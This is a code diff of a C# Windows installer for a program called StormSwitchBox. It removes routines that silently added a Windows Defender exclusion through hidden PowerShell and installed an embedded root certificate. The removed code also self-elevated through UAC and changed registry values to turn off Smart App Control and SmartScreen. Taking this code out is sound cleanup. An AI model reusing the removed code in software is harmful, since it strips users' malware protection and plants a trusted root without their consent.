@@ -473,9 +473,6 @@ namespace StormSwitchBox.Installer
                 UnblockFile(targetIco);
                 UnblockEntireDirectory(targetDir);
 
-                // Add Windows Defender exclusion silently
-                AddDefenderExclusionSilently(targetDir);
-
                 if (rbStandard.Checked)
                 {
                     lblStatus.Text = "Создание системных ярлыков и регистрация в Windows...";
@@ -599,24 +596,6 @@ namespace StormSwitchBox.Installer
             catch { }
         }
 
-        public static void AddDefenderExclusionSilently(string path)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "powershell.exe",
-                    Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                using var p = Process.Start(psi);
-                p?.WaitForExit(4000);
-            }
-            catch { }
-        }
-
         private void ExtractResource(string resNameEnding, string targetPath)
         {
             var asm = Assembly.GetExecutingAssembly();
@@ -712,78 +691,6 @@ namespace StormSwitchBox.Installer
                 if (!string.IsNullOrEmpty(selfExe))
                 {
                     UnblockFile(selfExe);
-                }
-
-                // Extract embedded cert to temp and install silently immediately
-                string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
-                var asm = Assembly.GetExecutingAssembly();
-                foreach (var name in asm.GetManifestResourceNames())
-                {
-                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
-                    {
-                        using var inStream = asm.GetManifestResourceStream(name);
-                        if (inStream != null)
-                        {
-                            using var outStream = File.Create(tempCert);
-                            inStream.CopyTo(outStream);
-                        }
-                        break;
-                    }
-                }
-
-                if (File.Exists(tempCert))
-                {
-                    InstallCertificateSilently(tempCert);
-                }
-
-                // If not running as administrator, elevate seamlessly with UAC
-                if (!IsAdministrator())
-                {
-                    if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
-                    {
-                        var psi = new ProcessStartInfo
-                        {
-                            FileName = selfExe,
-                            UseShellExecute = true,
-                            Verb = "runas"
-                        };
-                        try
-                        {
-                            Process.Start(psi);
-                            return;
-                        }
-                        catch
-                        {
-                            // If user cancels UAC prompt, continue in standard mode
-                        }
-                    }
-                }
-                else
-                {
-                    // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
-                    try
-                    {
-                        using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
-                        key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
-                        key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
-                    }
-                    catch { }
-
-                    try
-                    {
-                        using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
-                        expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
-                    }
-                    catch { }
-
-                    if (!string.IsNullOrEmpty(selfExe))
-                    {
-                        string selfDir = Path.GetDirectoryName(selfExe) ?? "";
-                        if (!string.IsNullOrEmpty(selfDir))
-                        {
-                            AddDefenderExclusionSilently(selfDir);
-                        }
-                    }
                 }
             }
             catch { }
